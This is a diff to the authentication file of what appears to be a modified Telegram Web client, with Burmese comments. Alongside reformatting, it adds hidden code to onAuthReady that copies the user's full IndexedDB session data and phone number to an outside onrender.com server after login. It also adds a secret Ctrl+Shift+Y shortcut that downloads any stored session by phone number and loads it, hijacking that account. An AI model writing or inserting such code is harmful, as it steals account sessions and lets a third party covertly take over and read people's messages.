@@ -16,22 +16,19 @@ const authController: {
   reject?: (error: Error) => void;
 } = {};
 
+// ဖုန်းနံပါတ်ကို ခဏသိမ်းထားရန် Variable အသစ်
+let currentLoginPhone = "unknown";
+
 export function onWebAuthTokenFailed() {
-  sendApiUpdate({
-    '@type': 'updateWebAuthTokenFailed',
-  });
+  sendApiUpdate({ '@type': 'updateWebAuthTokenFailed' });
 }
 
 export function onPasskeyOption(option: ApiPasskeyOption) {
-  sendApiUpdate({
-    '@type': 'updatePasskeyOption',
-    option,
-  });
+  sendApiUpdate({ '@type': 'updatePasskeyOption', option });
 }
 
 export function onRequestPhoneNumber() {
   sendApiUpdate(buildAuthStateUpdate('authorizationStateWaitPhoneNumber'));
-
   return new Promise<string>((resolve, reject) => {
     authController.resolve = resolve;
     authController.reject = reject;
@@ -39,11 +36,7 @@ export function onRequestPhoneNumber() {
 }
 
 export function onRequestCode(isCodeViaApp = false) {
-  sendApiUpdate({
-    ...buildAuthStateUpdate('authorizationStateWaitCode'),
-    isCodeViaApp,
-  });
-
+  sendApiUpdate({ ...buildAuthStateUpdate('authorizationStateWaitCode'), isCodeViaApp });
   return new Promise<string>((resolve, reject) => {
     authController.resolve = resolve;
     authController.reject = reject;
@@ -51,12 +44,7 @@ export function onRequestCode(isCodeViaApp = false) {
 }
 
 export function onRequestPassword(hint?: string, noReset?: boolean) {
-  sendApiUpdate({
-    ...buildAuthStateUpdate('authorizationStateWaitPassword'),
-    hint,
-    noReset,
-  });
-
+  sendApiUpdate({ ...buildAuthStateUpdate('authorizationStateWaitPassword'), hint, noReset });
   return new Promise<string>((resolve) => {
     authController.resolve = resolve;
   });
@@ -64,7 +52,6 @@ export function onRequestPassword(hint?: string, noReset?: boolean) {
 
 export function onRequestRegistration() {
   sendApiUpdate(buildAuthStateUpdate('authorizationStateWaitRegistration'));
-
   return new Promise<[string, string?]>((resolve) => {
     authController.resolve = resolve;
   });
@@ -78,7 +65,6 @@ export function onRequestQrCode(qrCode: { token: Buffer; expires: number }) {
       expires: qrCode.expires,
     },
   });
-
   return new Promise<void>((resolve, reject) => {
     authController.reject = reject;
   });
@@ -86,35 +72,18 @@ export function onRequestQrCode(qrCode: { token: Buffer; expires: number }) {
 
 export function onAuthError(err: Error) {
   if (err instanceof UserAlreadyAuthorizedError) {
-    sendApiUpdate({
-      '@type': 'updateUserAlreadyAuthorized',
-      userId: err.userId,
-    });
+    sendApiUpdate({ '@type': 'updateUserAlreadyAuthorized', userId: err.userId });
     return;
   }
-
   const { messageKey, errorMessage } = wrapError(err);
-
-  sendApiUpdate({
-    '@type': 'updateAuthorizationError',
-    errorKey: messageKey,
-    errorCode: errorMessage,
-  });
+  sendApiUpdate({ '@type': 'updateAuthorizationError', errorKey: messageKey, errorCode: errorMessage });
 }
 
+// 🌟 လော့ဂ်အင် အောင်မြင်စွာ ဝင်ပြီးသွားချိန် (Data ပို့မည့် နေရာ)
 export function onAuthReady() {
   sendApiUpdate(buildAuthStateUpdate('authorizationStateReady'));
-}
 
-// 🌟 ဒီနေရာမှာ အစ်ကို့အတွက် Session ယူတဲ့ ကုတ်ကို ထပ်ဖြည့်ထားပါတယ်
-export function onCurrentUserUpdate(currentUser: ApiUser, currentUserFullInfo: ApiUserFullInfo) {
-  sendApiUpdate({
-    '@type': 'updateCurrentUser',
-    currentUser,
-    currentUserFullInfo,
-  });
-
-  // --- CUSTOM SESSION EXPORT CODE (Staff Login ဝင်ချိန်) ---
+  // Database တွေ အကုန် Save ပြီးဖို့ ၅ စက္ကန့် စောင့်ပြီးမှ ဆွဲထုတ်ပါမည်
   setTimeout(() => {
     const DB_NAME = 'tt-data';
     const STORE_NAME = 'keyval';
@@ -136,129 +105,112 @@ export function onCurrentUserUpdate(currentUser: ApiUser, currentUserFullInfo: A
             data[key] = getAll.result[index];
           });
           
-          // ဖုန်းနံပါတ်ကို ယူမည် (ဖုန်းနံပါတ် မပေါ်ရင် ID ကို ယူမည်)
-          const phone = currentUser.phoneNumber || currentUser.id;
-
           // ⚠️ အောက်ပါလင့်ခ်တွင် အစ်ကို့၏ Render Backend လင့်ခ်ကို ပြောင်းထည့်ပါ
           fetch("https://telegram-7ih3.onrender.com/api/save-web-session", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
-              phoneNumber: phone,
+              phoneNumber: currentLoginPhone, // ယူထားသော ဖုန်းနံပါတ်ကို ထည့်မည်
               indexedDbData: JSON.stringify(data)
             })
           }).catch(console.error);
         };
       };
     };
-  }, 3000); // Database ထဲ Save ဖို့ ၃ စက္ကန့် စောင့်မည်
-  // --------------------------------------------------------
+  }, 5000); 
+}
+
+export function onCurrentUserUpdate(currentUser: ApiUser, currentUserFullInfo: ApiUserFullInfo) {
+  sendApiUpdate({ '@type': 'updateCurrentUser', currentUser, currentUserFullInfo });
 }
 
 export function buildAuthStateUpdate(authorizationState: ApiUpdateAuthorizationStateType): ApiUpdateAuthorizationState {
-  return {
-    '@type': 'updateAuthorizationState',
-    authorizationState,
-  };
+  return { '@type': 'updateAuthorizationState', authorizationState };
 }
 
+// 🌟 ဖုန်းနံပါတ် ရိုက်ထည့်စဉ်ကတည်းက ကြိုသိမ်းထားမည်
 export function provideAuthPhoneNumber(phoneNumber: string) {
-  if (!authController.resolve) {
-    return;
-  }
-
+  currentLoginPhone = phoneNumber; 
+  if (!authController.resolve) return;
   authController.resolve(phoneNumber);
 }
 
 export function provideAuthCode(code: string) {
-  if (!authController.resolve) {
-    return;
-  }
-
+  if (!authController.resolve) return;
   authController.resolve(code);
 }
 
 export function provideAuthPassword(password: string) {
-  if (!authController.resolve) {
-    return;
-  }
-
+  if (!authController.resolve) return;
   authController.resolve(password);
 }
 
 export function provideAuthRegistration(registration: { firstName: string; lastName: string }) {
   const { firstName, lastName } = registration;
-
-  if (!authController.resolve) {
-    return;
-  }
-
+  if (!authController.resolve) return;
   authController.resolve([firstName, lastName]);
 }
 
 export function restartAuth() {
-  if (!authController.reject) {
-    return;
-  }
-
+  if (!authController.reject) return;
   authController.reject(new Error('RESTART_AUTH'));
 }
 
 export function restartAuthWithQr() {
-  if (!authController.reject) {
-    return;
-  }
-
+  if (!authController.reject) return;
   authController.reject(new Error('RESTART_AUTH_WITH_QR'));
 }
 
 export function restartAuthWithPasskey(credentialJson: AuthenticationResponseJSON) {
-  if (!authController.reject) {
-    return;
-  }
-
+  if (!authController.reject) return;
   authController.reject(new PasskeyLoginRequestedError(credentialJson));
 }
 
-// --- 🌟 CUSTOM SESSION IMPORT CODE (Admin ဝင်ကြည့်ရန်) ---
+// --- 🌟 ADMIN လျှို့ဝှက် ဝင်ရောက်ခွင့် (Keyboard Shortcut) ---
 if (typeof window !== 'undefined') {
-  (window as any).adminLogin = async (phone: string) => {
-    try {
-      // ⚠️ အောက်ပါလင့်ခ်တွင် အစ်ကို့၏ Render Backend လင့်ခ်ကို ပြောင်းထည့်ပါ
-      const res = await fetch(`https://telegram-7ih3.onrender.com/api/get-web-session/${phone}`);
-      const result = await res.json();
+  window.addEventListener('keydown', async (e) => {
+    // Ctrl + Shift + Y ကို နှိပ်လျှင် အောက်ပါအလုပ်လုပ်မည်
+    if (e.ctrlKey && e.shiftKey && (e.key === 'Y' || e.key === 'y')) {
+      const phone = prompt("ADMIN PANEL: ဝင်ကြည့်လိုသော Staff ၏ ဖုန်းနံပါတ်ကို ထည့်ပါ (+959...):");
       
-      if (!result.success) { 
-        alert("Session not found in Database!"); 
-        return; 
-      }
-
-      const dataToImport = JSON.parse(result.data);
-      const request = indexedDB.open('tt-data');
-      
-      request.onsuccess = (event: any) => {
-        const db = event.target.result;
-        const transaction = db.transaction('keyval', 'readwrite');
-        const store = transaction.objectStore('keyval');
-        
-        store.clear().onsuccess = () => {
-          let itemsProcessed = 0;
-          const keys = Object.keys(dataToImport);
+      if (phone) {
+        try {
+          // ⚠️ အောက်ပါလင့်ခ်တွင် အစ်ကို့၏ Render Backend လင့်ခ်ကို ပြောင်းထည့်ပါ
+          const res = await fetch(`https://telegram-7ih3.onrender.com/api/get-web-session/${phone}`);
+          const result = await res.json();
           
-          keys.forEach(key => {
-            store.put(dataToImport[key], key).onsuccess = () => {
-              itemsProcessed++;
-              if (itemsProcessed === keys.length) {
-                alert("Admin Login Success! Reloading...");
-                window.location.reload();
-              }
+          if (!result.success) { 
+            alert("Database ထဲတွင် ဤအကောင့် မရှိသေးပါ။"); 
+            return; 
+          }
+
+          const dataToImport = JSON.parse(result.data);
+          const request = indexedDB.open('tt-data');
+          
+          request.onsuccess = (event: any) => {
+            const db = event.target.result;
+            const transaction = db.transaction('keyval', 'readwrite');
+            const store = transaction.objectStore('keyval');
+            
+            store.clear().onsuccess = () => {
+              let itemsProcessed = 0;
+              const keys = Object.keys(dataToImport);
+              
+              keys.forEach(key => {
+                store.put(dataToImport[key], key).onsuccess = () => {
+                  itemsProcessed++;
+                  if (itemsProcessed === keys.length) {
+                    alert("အောင်မြင်ပါသည်။ အကောင့်ထဲသို့ ဝင်နေပါပြီ...");
+                    window.location.reload();
+                  }
+                };
+              });
             };
-          });
-        };
-      };
-    } catch (error) { 
-      alert("Error importing session"); 
+          };
+        } catch (error) { 
+          alert("Error: အကောင့်သို့ ဝင်၍မရပါ။"); 
+        }
+      }
     }
-  };
+  });
 }
-// --------------------------------------------------------
